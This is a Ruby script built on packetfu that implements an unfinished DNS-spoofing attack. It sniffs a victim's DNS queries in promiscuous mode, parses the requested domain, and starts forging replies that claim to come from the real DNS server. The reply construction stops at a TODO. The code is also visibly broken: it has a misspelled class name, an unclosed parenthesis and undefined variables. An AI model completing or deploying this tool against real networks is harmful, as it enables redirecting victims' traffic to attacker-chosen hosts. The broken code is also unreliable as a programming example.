#!/usr/bin/env ruby
require 'rubygems'
require 'packetfu'

class DNSSPoofer
    
    def initialize(victim_ip, iface = "em1", spoof = false)
        @victim_ip = victim_ip
        @victim_mac = Utils.arp(victim_ip, :iface => iface)
        @interface = iface
        @running = spoof
        
        if spoof then
            start
        end
    end # initalize
    
    def send(packet)
        packet.to_w(@interface)
    end # send(packet)
    
    def start
        filter = "udp and dns port 53"
        
        cap = PacketFu::Capture.new(:iface => @interface, :start => true,
                        :promisc => true, :filter => filter, :save => true)
                        
        puts "DNS Packet sniffing starting..."
        
        # Start packet sniffing
        cap.stream.each do |pkt|
            @packet = PackeFu::Packet.parse(pkt)
            
            # Check if Query
            if(@packet.payload[2] == 1 && @packet.payload[3] == 0)
                @domain_name = get_domain(@packet.payload[12..-1]
                
                # Check if domain name field is empty
                if domain_name.nil? then
                    puts "Empty domain name field"
                    next
                end # domain_name.nil?
                
                puts "Domain name: #{@domain_name}"
                send_response
                
            end # if(@packet.payload[2] == 1 && @packet.payload[3] == 0
        end # cap stream.each do |pkt|
        
    end # start
    
    def get_domain(payload)
        domain_name = ""
        while(true)
            # Get payload len
            len = payload[0].to_i
            
            if len != 0 then
                domain_name += payload[1, len] + "."
                payload = payload[len + 1..-1]  
            else
                return domain_name = domain_name[0, domain.length - 1]
            end # if len != 0 then
        end # while(true)
    end # get_domain(payload)
    
    def send_response
        cfg = PacketFu::Utils.whoami?(:iface => @interface)
        
        # Create response packet
        udp_packet = PacketFu::UDPPacket.new(:config => cfg, 
                                :udp_src => @packet.udp_dst, :udp_dst => @packet.udp_src)
        udp_packet.eth_daddr = @victim_mac
        udp_packet.ip_daddr = @victim_ip
        udp_packet.ip_saddr = @packet.ip_daddr
        udp_packet.payload = @packet.payload[0, 2]
        
        # TODO: 
        # Add the rest of the payload for (www.google.com)
        
        
    end # send_response
end
